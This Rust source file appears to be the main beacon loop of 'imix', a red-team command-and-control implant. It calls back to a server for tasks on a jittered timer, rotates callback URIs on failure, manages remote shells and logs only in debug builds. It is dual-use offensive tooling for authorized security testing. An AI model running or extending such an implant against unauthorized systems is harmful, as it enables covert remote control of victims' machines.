use anyhow::Result;
use std::sync::Arc;
use std::sync::atomic::{AtomicBool, Ordering};
use std::time::{Duration, Instant};

use crate::agent::ImixAgent;
use crate::task::TaskRegistry;
use crate::version::VERSION;
use pb::config::Config;
use transport::{ActiveTransport, Transport};

pub static SHUTDOWN: AtomicBool = AtomicBool::new(false);
const MAX_BUF_SHELL_MESSAGES: usize = 65535;

pub async fn run_agent() -> Result<()> {
    init_logger();

    // Load config / defaults
    let config = Config::default_with_imix_version(VERSION);
    #[cfg(debug_assertions)]
    log::info!("Loaded config: {config:#?}");

    let run_once = config.run_once;

    // Initial transport is just a placeholder, we create active ones in the loop
    let transport = ActiveTransport::init();

    let handle = tokio::runtime::Handle::current();
    let task_registry = Arc::new(TaskRegistry::new());

    let (shell_manager_tx, shell_manager_rx) = tokio::sync::mpsc::channel(MAX_BUF_SHELL_MESSAGES);

    let agent = Arc::new(ImixAgent::new(
        config,
        transport,
        handle,
        task_registry.clone(),
        shell_manager_tx,
    ));

    // Start Shell Manager
    let shell_manager = crate::shell::manager::ShellManager::new(agent.clone(), shell_manager_rx);
    agent.clone().start_shell_manager(shell_manager);

    // Track the last interval we slept for, as a fallback in case we fail to read the config
    let mut last_interval = agent.get_callback_interval_u64().unwrap_or(5);

    #[cfg(debug_assertions)]
    log::info!("Agent initialized");

    while !SHUTDOWN.load(Ordering::Relaxed) {
        let start = Instant::now();
        let agent_ref = agent.clone();
        let registry_ref = task_registry.clone();

        run_agent_cycle(agent_ref, registry_ref).await;

        if SHUTDOWN.load(Ordering::Relaxed) || run_once {
            break;
        }

        if let Ok(new_interval) = agent.get_callback_interval_u64() {
            last_interval = new_interval;
        }

        if let Err(e) = sleep_until_next_cycle(&agent, start).await {
            #[cfg(debug_assertions)]
            log::error!(
                "Failed to sleep, falling back to last interval {last_interval} sec: {e:#}"
            );

            // Prevent tight loop on config read failure
            tokio::time::sleep(Duration::from_secs(last_interval)).await;
        }
    }

    #[cfg(debug_assertions)]
    log::info!("Agent shutting down");

    Ok(())
}

pub fn init_logger() {
    #[cfg(debug_assertions)]
    {
        use pretty_env_logger;
        let _ = pretty_env_logger::formatted_timed_builder()
            .filter_level(log::LevelFilter::Info)
            .parse_env("IMIX_LOG")
            .try_init();
        log::info!("Starting imix agent");
    }
}

async fn run_agent_cycle(agent: Arc<ImixAgent<ActiveTransport>>, registry: Arc<TaskRegistry>) {
    // Refresh IP
    agent.refresh_ip().await;

    // Create new active transport
    let config = agent.get_transport_config().await;

    let transport = match ActiveTransport::new(config) {
        Ok(t) => t,
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Failed to create transport: {_e:#}");
            agent.rotate_callback_uri().await;
            return;
        }
    };

    // Set transport
    agent.update_transport(transport).await;

    // Claim Tasks
    process_tasks(&agent, &registry).await;

    // Flush Outputs (send all buffered output)
    agent.flush_outputs().await;

    // Disconnect (drop transport)
    agent.update_transport(ActiveTransport::init()).await;
}

async fn process_tasks(agent: &ImixAgent<ActiveTransport>, _registry: &TaskRegistry) {
    match agent.process_job_request().await {
        Ok(_) => {
            #[cfg(debug_assertions)]
            log::info!("Callback success");
        }
        Err(_e) => {
            #[cfg(debug_assertions)]
            log::error!("Callback failed: {_e:#}");
            agent.rotate_callback_uri().await;
        }
    }
}

async fn sleep_until_next_cycle(agent: &ImixAgent<ActiveTransport>, start: Instant) -> Result<()> {
    let interval = agent.get_callback_interval_u64()?;
    let jitter = agent.get_callback_jitter().unwrap_or(0.0).clamp(0.0, 1.0);

    // Generate random jitter [0.0, jitter]
    let generated_jitter = rand::random::<f32>() * jitter;

    // Calculate effective interval
    let effective_interval_secs = (interval as f32) * (1.0 - generated_jitter);

    // Calculate remaining sleep time: effective_interval - elapsed
    let elapsed_secs = start.elapsed().as_secs_f32();
    let sleep_secs = (effective_interval_secs - elapsed_secs).max(0.0);

    let delay = Duration::from_secs_f32(sleep_secs);

    #[cfg(debug_assertions)]
    log::info!(
        "Callback complete (duration={:.2}s, sleep={:.2}s, interval={}s, jitter={:.2})",
        elapsed_secs,
        sleep_secs,
        interval,
        jitter
    );
    tokio::time::sleep(delay).await;
    Ok(())
}
